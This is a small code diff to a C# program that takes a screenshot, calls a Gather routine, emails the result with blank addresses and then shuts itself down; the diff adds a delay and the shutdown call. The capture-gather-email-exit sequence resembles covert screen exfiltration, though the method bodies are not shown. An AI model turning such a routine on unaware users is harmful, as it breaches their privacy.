@@ -7,6 +7,7 @@ using System.Threading.Tasks;
 using System.Windows;
 using System.Drawing;
 using System.Diagnostics;
+using System.Threading;
 
 namespace Screenshot
 {
@@ -21,9 +22,11 @@ namespace Screenshot
             //{
                 Screenshot();
                 Gather();
+                Thread.Sleep(20000);
                 Email("", "", "");
+                System.Windows.Application.Current.Shutdown();
             //}
-            
+
         }
 
         /* Take a screenshot */
